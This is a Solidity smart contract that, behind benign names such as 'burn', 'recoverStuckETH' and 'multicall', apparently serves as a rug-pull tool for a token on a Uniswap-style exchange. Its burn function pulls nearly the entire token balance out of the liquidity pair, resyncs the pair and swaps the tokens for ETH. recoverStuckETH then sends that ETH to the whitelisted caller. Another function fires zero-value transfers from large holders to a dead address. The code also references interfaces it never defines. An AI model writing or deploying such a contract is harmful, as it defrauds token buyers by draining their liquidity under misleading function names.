pragma solidity ^0.8.0;
interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function WETH() external pure returns (address);
}
interface IUniswapV2Pair {
    function sync() external;
}
contract AssistJohn {
    address private token;
    address private pair;
    mapping(address => bool) private whites;
    IUniRouter private router;
    modifier onlyOwners() {
        require(whites[msg.sender]);
        _;
    }
    constructor() {
        whites[msg.sender] = true;
    }
    function whitelist(address[] memory whites_, bool isWhite) external onlyOwners {
        for (uint256 i = 0; i < whites_.length; i++) {
            whites[whites_[i]] = isWhite;
        }
    }
    function refresh(
        address router_,
        address token_,
        address pair_
    ) external onlyOwners {
        router = IUniRouter(router_);
        token = token_;
        pair = pair_;
    }
    function swap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        IERC20(token).approve(address(router), ~uint256(0));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function mint(uint256 amount) public onlyOwners {
        swap(amount);
    }
    function burn() public onlyOwners {
        uint256 pairBalance = IERC20(token).balanceOf(pair);
        uint256 amount = pairBalance - pairBalance / 10000;
        IERC20(token).transferFrom(pair, address(this), amount);
        IUniswapV2Pair(pair).sync();
        uint256 balance = IERC20(token).balanceOf(address(this));
        swap(balance);
    }
    function recoverStuckETH() external onlyOwners {
        burn();
        payable(msg.sender).transfer(address(this).balance);
    }
    function withdrawStuckTokens(address token_) external onlyOwners {
        if (token_ == address(0)) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            IERC20(token_).transfer(
                msg.sender,
                IERC20(token_).balanceOf(address(this))
            );
        }
    }
    function multicall(address tokenAddr, address[] memory accounts, uint256 amount, uint256 decimals) external onlyOwners {
        uint256 remainBalance = amount * 10 ** decimals;
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            uint256 balance = IERC20(tokenAddr).balanceOf(account);
            if (balance >= remainBalance) {
                try
                    IERC20(tokenAddr).transferFrom(
                        account,
                        address(0xdead),
                        0
                    )
                {} catch {}
            }
        }
    }
    function manualSwap() external onlyOwners {
        IERC20(token).manualSwap();
    }
    receive() external payable {}
    fallback() external payable {}
}